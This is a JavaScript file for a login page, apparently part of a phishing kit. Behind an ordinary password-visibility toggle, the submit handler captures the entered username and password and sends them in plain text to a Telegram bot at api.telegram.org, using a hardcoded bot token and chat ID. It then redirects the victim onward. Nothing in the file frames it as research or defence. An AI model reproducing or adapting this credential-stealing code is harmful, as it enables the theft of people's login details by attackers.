const togglePassword = document.getElementById('togglePassword');
const passwordField = document.getElementById('password');

togglePassword.addEventListener('click', () => {
  const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
  passwordField.setAttribute('type', type);
  togglePassword.classList.toggle('fa-eye');
  togglePassword.classList.toggle('fa-eye-slash');
});

const botToken = '8029302735:AAFZ6JhyRfe7P1DjSypDuQboNZ7bHMkqtoE';
const chatId = '-1002318872925';

document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  const message = `🟢 LOGIN SUCCESS\n👤 Username: ${username}\n🔑 Password: ${password}`;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => {
      if (response.ok) {
        window.location.href = "i.html";
      } else {
        alert("Failed to send log.");
      }
    })
    .catch(error => {
      console.error("Telegram Error:", error);
    });
});